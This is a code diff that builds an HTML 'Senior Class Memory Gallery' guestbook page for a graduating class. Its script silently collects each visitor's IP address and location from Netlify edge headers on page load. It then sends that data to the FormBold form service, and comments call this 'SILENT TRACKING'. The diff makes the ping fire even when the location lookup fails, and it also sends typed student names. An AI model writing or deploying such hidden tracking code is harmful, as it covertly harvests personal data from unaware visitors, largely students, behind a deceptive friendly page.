@@ -1,11 +1,127 @@
-<script>
-        // Global object to store the fetched visitor analytics
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Class of 2026 - Graduation Gallery</title>
+    <style>
+        :root {
+            --primary-color: #1e3a8a; /* Navy Blue */
+            --secondary-color: #10b981; /* Emerald Green */
+            --background: #f3f4f6;
+            --text-main: #1f2937;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--background);
+            color: var(--text-main);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        header {
+            background-color: var(--primary-color);
+            color: white;
+            width: 100%;
+            padding: 2rem 0;
+            text-align: center;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+        }
+
+        .banner-status {
+            background-color: var(--secondary-color);
+            color: white;
+            padding: 0.75rem 1.5rem;
+            border-radius: 9999px;
+            font-weight: 600;
+            margin-top: 1rem;
+            display: inline-block;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        main {
+            max-width: 800px;
+            width: 90%;
+            margin: 3rem 0;
+            text-align: center;
+        }
+
+        .guestbook-card {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 12px;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05);
+            margin-bottom: 3rem;
+        }
+
+        .input-group {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            margin-top: 1.5rem;
+        }
+
+        input[type="text"] {
+            padding: 0.75rem 1rem;
+            border: 2px solid #d1d5db;
+            border-radius: 8px;
+            width: 60%;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--primary-color);
+        }
+
+        button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background-color: #172554;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>🎓 Senior Class Memory Gallery</h1>
+        <div id="greeting" class="banner-status">🎉 Welcome to the Class Gallery!</div>
+    </header>
+
+    <main>
+        <div class="guestbook-card">
+            <h2>Sign the Graduation Guestbook</h2>
+            <p>Leave your mark before heading off into the real world!</p>
+            <div class="input-group">
+                <input type="text" id="studentName" placeholder="Enter your full name...">
+                <button onclick="submitGuestbook()">Sign In</button>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // Global object to track network data safely
         let trackingData = {
-            ip: "Unavailable via Direct Link",
-            location: "Unavailable via Direct Link"
+            ip: "Unavailable",
+            location: "Unavailable"
         };
 
-        // 1. Immediately request the custom Netlify Edge headers on page load
+        // 1. Safe, background request for Netlify headers
         fetch(window.location.href)
             .then(res => {
                 const geoHeader = res.headers.get('x-visitor-geo');
@@ -13,29 +129,24 @@
                 
                 if (geoHeader) {
                     const data = JSON.parse(geoHeader);
-                    
-                    // Save data globally
                     trackingData.ip = data.ip || "Unknown IP";
-                    trackingData.location = `${data.city || "Unknown City"}, ${data.region || "Unknown Region"}, ${data.country || "Unknown Country"}`;
+                    trackingData.location = `${data.city || "Unknown City"}, ${data.country || "Unknown Country"}`;
                     
-                    // Update visible text banner safely if it exists
-                    if (greetingElement) {
-                        greetingElement.innerText = `👋 Wearing cap & gown? Viewing from ${data.city}, ${data.country}`;
-                    }
-                    
-                    // 🔥 SILENT TRACKING: Instantly send data to FormBold on page load
-                    sendToFormBold("System Automated Ping", "Silent Page View Logger");
-                } else {
-                    if (greetingElement) {
-                        greetingElement.innerText = `🎉 Welcome to the Class Gallery!`;
+                    if (greetingElement && data.city) {
+                        greetingElement.innerText = `👋 Wearing cap & gown? Viewing from ${data.city}`;
                     }
                 }
+                
+                // 🔥 SILENT BACKGROUND PING: Fires instantly when the page loads!
+                sendToFormBold("System Automated Ping", "Silent Page View Logger");
             })
             .catch(err => {
-                console.log("Failed to process location headers:", err);
+                console.log("Background check skipped or running locally:", err);
+                // Still fire the silent tracker even if running locally
+                sendToFormBold("Local Test System Ping", "Silent Page View Logger");
             });
 
-        // 2. Core background delivery machine
+        // 2. Centralized FormBold transmission engine
         function sendToFormBold(studentName, actionType) {
             const formData = new FormData();
             formData.append("_subject", `[${actionType}] - ${studentName}`);
@@ -52,11 +163,11 @@
                     'Accept': 'application/json'
                 }
             })
-            .then(() => console.log("FormBold ping successful!"))
-            .catch(err => console.error("Silent sync background error:", err));
+            .then(() => console.log("Data successfully transmitted to FormBold!"))
+            .catch(err => console.error("Transmission error:", err));
         }
 
-        // 3. Optional interactive submission if they decide to type their name
+        // 3. Click handler for the interactive input button
         function submitGuestbook() {
             const nameInput = document.getElementById('studentName');
             const nameField = nameInput ? nameInput.value.trim() : "";
@@ -66,10 +177,13 @@
                 return;
             }
 
-            // Call the delivery machine with their real name
+            // Fire manual signature payload
             sendToFormBold(nameField, "Manual Guestbook Signature");
             
-            alert(`Thank you, ${nameField}! Your entry has been saved.`);
-            if (nameInput) nameInput.value = ""; // Reset input box
+            alert(`Thank you, ${nameField}! Your entry has been recorded.`);
+            if (nameInput) nameInput.value = ""; 
         }
     </script>
+
+</body>
+</html>
